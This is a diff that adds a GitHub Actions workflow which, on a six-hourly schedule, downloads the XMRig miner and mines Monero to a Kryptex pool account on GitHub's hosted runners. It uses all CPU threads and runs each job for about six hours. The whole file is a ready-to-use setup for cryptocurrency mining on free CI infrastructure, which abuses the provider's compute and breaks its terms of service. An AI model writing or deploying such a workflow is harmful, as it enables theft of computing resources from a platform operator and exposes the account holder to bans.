@@ -1,0 +1,40 @@
+name: Kryptex CPU Mining
+
+on:
+  schedule:
+    - cron: '5 0,6,12,18 * * *'  # Every 6 hours 5 minutes: 00:05, 06:05, 12:05, 18:05 UTC
+  workflow_dispatch:  # Allow manual trigger
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 365  # 6 hours 5 minutes
+
+    steps:
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y wget tar
+
+      - name: Download and extract XMRig for Kryptex
+        run: |
+          mkdir -p ~/kryptex
+          cd ~/kryptex
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+          tar -xzf xmrig-6.21.3-linux-static-x64.tar.gz
+          cd xmrig-6.21.3
+          chmod +x xmrig
+
+      - name: Start mining
+        run: |
+          cd ~/kryptex/xmrig-6.21.3
+          worker_name="github-actions-${{ github.run_id }}"
+          ./xmrig \
+            -o xmr.kryptex.network:7029 \
+            -u ${{ secrets.KRYPTEX_EMAIL }}/$worker_name \
+            -p ${{ secrets.KRYPTEX_PASSWORD }} \
+            -k \
+            --coin monero \
+            -a rx/0 \
+            --threads=$(nproc) \
+            --donate-level=1
